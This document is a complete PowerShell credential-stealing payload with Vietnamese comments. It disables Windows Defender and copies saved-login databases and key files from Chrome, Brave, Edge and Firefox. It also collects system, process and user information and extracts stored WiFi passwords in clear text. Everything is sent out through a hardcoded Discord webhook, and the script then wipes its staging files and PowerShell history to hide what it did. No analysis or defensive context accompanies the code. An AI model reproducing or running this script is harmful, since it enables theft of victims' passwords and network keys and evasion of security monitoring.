#-- Payload configuration --#

$WEBHOOK_URL = 'https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj'

# Thu muc tam
$destDir = "$env:TEMP\Exfil_$env:USERNAME"
if (-Not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force }

$browserDir = "$destDir\BrowserData"
if (-Not (Test-Path $browserDir)) { New-Item -ItemType Directory -Path $browserDir -Force }

# Tat Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# ==========================================
# GUI FILE TXT LEN DISCORD
# ==========================================
function Send-DiscordTextFile {
    param([string]$FilePath, [string]$Title = "")
    
    if (-Not (Test-Path $FilePath)) { 
        Write-Host "[-] File not found: $FilePath"
        return
    }
    
    $fileName = Split-Path $FilePath -Leaf
    $content = Get-Content $FilePath -Raw -ErrorAction SilentlyContinue
    
    if ([string]::IsNullOrWhiteSpace($content)) {
        Write-Host "[-] Empty file: $fileName"
        return
    }
    
    # Gioi han 1900 ky tu
    if ($content.Length -gt 1900) {
        $content = $content.Substring(0, 1900) + "...[TRUNCATED]"
    }
    
    $message = "**$Title**`n```$content```"
    $payload = @{ content = $message } | ConvertTo-Json
    
    try {
        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
        Write-Host "[+] Sent: $fileName"
    } catch {
        Write-Host "[-] Failed: $fileName"
    }
}

# Function copy browser files
function CopyBrowserFiles($browserName, $browserDirPath, $filesToCopy) {
    $browserDestDir = Join-Path -Path $browserDir -ChildPath $browserName
    if (-Not (Test-Path $browserDestDir)) { New-Item -ItemType Directory -Path $browserDestDir -Force }
    
    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDirPath -ChildPath $file
        if (Test-Path $source) {
            Copy-Item -Path $source -Destination $browserDestDir -Force -ErrorAction SilentlyContinue
            Write-Host "$browserName - Copied: $file"
        }
    }
}

# ==========================================
# 1. GOOGLE CHROME
# ==========================================
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
if (Test-Path $chromeDir) {
    CopyBrowserFiles "Chrome" $chromeDir @("Login Data")
    $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    if (Test-Path $localState) { Copy-Item $localState "$browserDir\Chrome\" -Force -ErrorAction SilentlyContinue }
} else { Write-Host "Chrome - Not installed" }

# ==========================================
# 2. BRAVE
# ==========================================
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
if (Test-Path $braveDir) {
    CopyBrowserFiles "Brave" $braveDir @("Login Data")
    $localState = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
    if (Test-Path $localState) { Copy-Item $localState "$browserDir\Brave\" -Force -ErrorAction SilentlyContinue }
} else { Write-Host "Brave - Not installed" }

# ==========================================
# 3. FIREFOX
# ==========================================
$firefoxProfileDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $firefoxProfileDir) {
    $firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default*" | Select-Object -First 1
    if ($firefoxProfile) {
        $firefoxDir = $firefoxProfile.FullName
        CopyBrowserFiles "Firefox" $firefoxDir @("logins.json", "key4.db")
    }
} else { Write-Host "Firefox - Not installed" }

# ==========================================
# 4. MICROSOFT EDGE
# ==========================================
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
if (Test-Path $edgeDir) {
    CopyBrowserFiles "Edge" $edgeDir @("Login Data")
    $localState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    if (Test-Path $localState) { Copy-Item $localState "$browserDir\Edge\" -Force -ErrorAction SilentlyContinue }
} else { Write-Host "Edge - Not installed" }

# ==========================================
# 5. SYSTEM INFORMATION (TXT)
# ==========================================
Write-Host "[+] Gathering system information..."
$sysInfoDir = "$destDir\SystemInfo"
New-Item -ItemType Directory -Path $sysInfoDir -Force

Get-ComputerInfo | Out-File "$sysInfoDir\computer_info.txt" -ErrorAction SilentlyContinue
Get-Process | Out-File "$sysInfoDir\process_list.txt" -ErrorAction SilentlyContinue
Get-LocalUser | Where-Object { $_.Enabled } | Out-File "$sysInfoDir\local_users.txt" -ErrorAction SilentlyContinue

# ==========================================
# 6. WIFI PASSWORDS (TXT)
# ==========================================
Write-Host "[+] Extracting WiFi passwords..."
$wifiFile = "$destDir\WiFi_Details.txt"
"=== WiFi Passwords for $env:COMPUTERNAME ===" | Out-File $wifiFile
"Extracted: $(Get-Date)" | Out-File $wifiFile -Append
"=========================================" | Out-File $wifiFile -Append

$wifiProfiles = netsh wlan show profiles | Select-String ":\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
foreach ($profile in $wifiProfiles) {
    $profileDetails = netsh wlan show profile name="$profile" key=clear
    $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
    if (-not $keyContent) { $keyContent = "Open network" }
    "$profile : $keyContent" | Out-File $wifiFile -Append
}

# ==========================================
# 7. GUI TAT CA FILE TXT LEN DISCORD
# ==========================================
Write-Host "[+] Sending data to Discord..."

# Gui thong tin target
Send-DiscordTextFile -FilePath $wifiFile -Title "WiFi Passwords - $env:COMPUTERNAME"

# Gui System Info
Send-DiscordTextFile -FilePath "$sysInfoDir\computer_info.txt" -Title "Computer Info - $env:COMPUTERNAME"
Send-DiscordTextFile -FilePath "$sysInfoDir\process_list.txt" -Title "Process List - $env:COMPUTERNAME"
Send-DiscordTextFile -FilePath "$sysInfoDir\local_users.txt" -Title "Local Users - $env:COMPUTERNAME"

# Gui browser credentials (dang text)
$browsers = @("Chrome", "Brave", "Edge", "Firefox")
foreach ($browser in $browsers) {
    $browserDataDir = "$browserDir\$browser"
    if (Test-Path $browserDataDir) {
        $loginDataFile = "$browserDataDir\Login Data"
        if (Test-Path $loginDataFile) {
            # Chuyen doi file nhi phan sang text (doc cac ky tu in duoc)
            $bytes = [System.IO.File]::ReadAllBytes($loginDataFile)
            $textContent = ""
            for ($i = 0; $i -lt [Math]::Min(2000, $bytes.Length); $i++) {
                $c = [char]$bytes[$i]
                if ([char]::IsControl($c) -or $c -gt 127) { $c = "." }
                $textContent += $c
            }
            $tempFile = "$env:TEMP\temp_$browser.txt"
            $textContent | Out-File $tempFile
            Send-DiscordTextFile -FilePath $tempFile -Title "$browser - Login Data (Raw)"
            Remove-Item $tempFile -Force
        }
    }
}

# ==========================================
# 8. CLEANUP
# ==========================================
Write-Host "[+] Cleaning up..."
Remove-Item $destDir -Recurse -Force -ErrorAction SilentlyContinue
Clear-History
$historyPath = (Get-PSReadLineOption).HistorySavePath
if ($historyPath -and (Test-Path $historyPath)) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
}

# Bat lai Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue

Write-Host "[+] Done!"
exit
